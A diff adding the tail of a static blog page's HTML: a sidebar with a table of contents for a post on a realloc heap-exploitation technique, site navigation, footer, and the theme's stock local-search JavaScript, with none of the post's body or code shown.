+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/DC-2.html" rel="prev" title="vulnhub DC-2靶机">
+                vulnhub DC-2靶机 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ethushiroha" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#realloc-%E7%9A%84-push-%E6%93%8D%E4%BD%9C"><span class="nav-number">2.</span> <span class="nav-text">realloc 的 push 操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E6%95%B4%E5%AE%9E%E6%88%98"><span class="nav-number">3.</span> <span class="nav-text">调整实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E6%95%B4%E6%8A%80%E5%B7%A7"><span class="nav-number">3.1.</span> <span class="nav-text">调整技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84exp"><span class="nav-number">3.2.</span> <span class="nav-text">完整的exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">stdout</span>
+
+  
+</div>
+-->
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
